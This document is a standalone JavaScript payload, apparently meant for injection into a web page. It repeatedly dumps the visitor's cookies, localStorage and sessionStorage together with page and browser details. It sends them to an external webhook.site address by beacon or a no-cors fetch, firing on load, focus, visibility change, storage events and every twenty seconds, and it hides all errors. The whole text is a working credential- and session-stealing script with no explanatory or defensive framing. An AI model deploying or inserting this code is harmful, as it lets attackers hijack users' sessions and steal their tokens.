(function(){
  try{
    var HOOK='https://webhook.site/12e29837-1aa7-4baa-9ed8-4c902831266d';
    function dump(s){
      var o={};
      try{
        for(var i=0;i<s.length;i++){
          var k=s.key(i); var v=s.getItem(k);
          if(typeof v==='string' && v.length>4000) v=v.slice(0,4000)+'...[trunc]';
          o[k]=v;
        }
      }catch(e){ o.__err=String(e); }
      return o;
    }
    var last='';
    function snap(reason){
      var o={tag:'i2621-session',reason:reason,ts:new Date().toISOString(),
        origin:location.origin,href:location.href,path:location.pathname+location.search,
        ref:document.referrer,ua:navigator.userAgent,vis:document.visibilityState,
        ls:dump(localStorage),ss:dump(sessionStorage),ck:document.cookie};
      return o;
    }
    function send(reason){
      try{
        var b=JSON.stringify(snap(reason));
        if(b.length>180000) b=b.slice(0,180000);
        if(b===last) return;
        last=b;
        if(navigator.sendBeacon){
          try{ if(navigator.sendBeacon(HOOK,new Blob([b],{type:'application/json'}))) return; }catch(e){}
        }
        fetch(HOOK,{method:'POST',mode:'no-cors',credentials:'omit',headers:{'Content-Type':'application/json'},body:b}).catch(function(){});
      }catch(e){}
    }
    send('load');
    try{window.addEventListener('storage',function(){setTimeout(function(){send('storage');},500);});}catch(e){}
    try{setInterval(function(){send('interval');},20000);}catch(e){}
    try{document.addEventListener('visibilitychange',function(){send('visibility');});}catch(e){}
    try{window.addEventListener('focus',function(){send('focus');});}catch(e){}
  }catch(e){}
})();
